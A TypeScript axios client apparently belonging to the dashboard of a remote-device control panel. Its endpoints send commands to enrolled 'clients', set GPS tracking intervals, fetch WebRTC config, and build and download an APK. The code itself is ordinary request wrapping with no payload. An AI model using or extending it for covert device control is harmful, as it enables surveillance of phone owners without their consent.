import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  timeout: 30000,
  withCredentials: true,
  headers: { 'Content-Type': 'application/json' },
});

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('auth-token');
  if (token && !config.headers?.Authorization) {
    config.headers = config.headers || {};
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

const AUTH_WHITELIST = ['/api/auth/login'];
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      const url: string = error.config?.url || '';
      const isAuthEndpoint = AUTH_WHITELIST.some(ep => url === ep || url.endsWith(ep));
      if (!isAuthEndpoint) {
        localStorage.removeItem('auth-user');
        localStorage.removeItem('auth-token');
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
    }
    return Promise.reject(error);
  }
);

export default api;

export const authApi = {
  login: (username: string, password: string) => api.post('/auth/login', { username, password }),
  logout: () => api.post('/auth/logout'),
  me: () => api.get('/auth/me'),
  changePassword: (currentPassword: string, newPassword: string) => api.post('/auth/change-password', { currentPassword, newPassword }),
  updateProfile: (data: { username?: string; email?: string }) => api.post('/auth/update-profile', data),
};

export const dashboardApi = { getData: (config?: { signal?: AbortSignal }) => api.get('/dashboard', config) };

export const clientsApi = {
  getAll: () => api.get('/clients'),
  getOne: (id: string) => api.get(`/client/${id}`),
  getPage: (id: string, page: string) => api.get(`/client/${id}/${page}`),
  getWebRtcConfig: (id: string) => api.get(`/client/${id}/webrtc-config`),
  delete: (id: string) => api.delete(`/client/${id}`),
  rotateCredential: (id: string) => api.post(`/client/${id}/credential/rotate`),
  revokeCredential: (id: string) => api.post(`/client/${id}/credential/revoke`),
  sendCommand: (id: string, cmd: string, params?: Record<string, unknown>) => api.post(`/cmd/${id}/${cmd}`, params || {}),
  setGps: (id: string, interval: number) => api.post(`/gps/${id}/${interval}`),
};

export const logsApi = {
  getLogs: (params?: { type?: string; category?: string; search?: string; limit?: number }) => api.get('/logs', { params }),
  getStats: () => api.get('/logs/stats'),
  clear: () => api.post('/logs/clear'),
};

export const builderApi = {
  build: (formData: FormData) => api.post('/builder/build', formData, { headers: { 'Content-Type': 'multipart/form-data' }, timeout: 600000 }),
  cancelBuild: () => api.post('/builder/cancel'),
  downloadApk: (onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get('/builder/download', { responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
};

export const usersApi = {
  getAll: () => api.get('/users'),
  create: (data: { username: string; email: string; password: string; role: string; permissions?: string[] }) => api.post('/users', data),
  update: (id: number, data: { username?: string; email?: string; role?: string; permissions?: string[] }) => api.put(`/users/${id}`, data),
  updatePermissions: (id: number, permissions: string[]) => api.put(`/users/${id}/permissions`, { permissions }),
  getPermissionsSchema: () => api.get('/users/permissions-schema'),
  resetPassword: (id: number, password: string) => api.put(`/users/${id}/password`, { password }),
  delete: (id: number) => api.delete(`/users/${id}`),
};
